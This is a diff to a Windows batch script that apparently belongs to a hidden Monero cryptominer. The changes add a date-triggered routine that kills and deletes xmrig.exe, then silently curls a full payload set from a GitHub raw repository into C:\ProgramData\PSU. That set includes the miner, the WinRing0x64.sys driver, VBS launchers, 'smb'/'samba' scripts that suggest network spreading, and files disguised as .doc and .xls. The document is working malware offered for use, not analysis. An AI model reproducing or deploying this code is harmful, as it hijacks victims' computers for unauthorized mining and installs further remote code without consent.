@@ -36,6 +36,8 @@ if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.29 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.30 goto next1
 goto skip
 :next1
+if %date:~0,2% == 01 goto download2
+if %date:~7,2% == 01 goto download2
 set daysofweek=Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday
 for /F "skip=2 tokens=2-4 delims=," %%A in ('WMIC Path Win32_LocalTime Get DayOfWeek /Format:csv') do set daynumber=%%A
 if %daynumber% == 0 set daynumber=7
@@ -1120,7 +1122,7 @@ goto run
 
 :download
 ping -n 2 www.google.com
-if "%%errorlevel%%" == "0" goto online
+if "%errorlevel%" == "0" goto online
 goto run
 
 :online
@@ -1129,5 +1131,32 @@ timeout 0 >> nul
 del "C:\ProgramData\PSU\xmrig.exe"
 timeout 0 >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/xmrig.txt" -o "C:\ProgramData\PSU\xmrig.exe"
+timeout 35
+goto run
+
+:download2
+ping -n 2 www.google.com
+if "%errorlevel%" == "0" goto online2
+goto run
+
+:online2
+taskkill /IM xmrig.exe /F
+timeout 0 >> nul
+del "C:\ProgramData\PSU\xmrig.exe"
+timeout 0 >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/Install.txt" -o "C:\ProgramData\PSU\Install.vbs" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/Start-Monero.txt" -o "C:\ProgramData\PSU\Start-Monero.bat" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/WinRing0x64.txt" -o "C:\ProgramData\PSU\WinRing0x64.sys" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/bgin.txt" -o "C:\ProgramData\PSU\bgin.bat" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/check.txt" -o "C:\ProgramData\PSU\check.bat" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/config.txt" -o "C:\ProgramData\PSU\config.json" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/execute.txt" -o "C:\ProgramData\PSU\execute.vbs" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/process.txt" -o "C:\ProgramData\PSU\process.bat" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/run.txt" -o "C:\ProgramData\PSU\run.doc" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/run2.txt" -o "C:\ProgramData\PSU\run.xls" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/samba.txt" -o "C:\ProgramData\PSU\samba.vbs" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/smb.txt" -o "C:\ProgramData\PSU\smb.bat" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/start.txt" -o "C:\ProgramData\PSU\start.vbs" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/xmrig.txt" -o "C:\ProgramData\PSU\xmrig.exe" >> nul
 timeout 35
 goto run
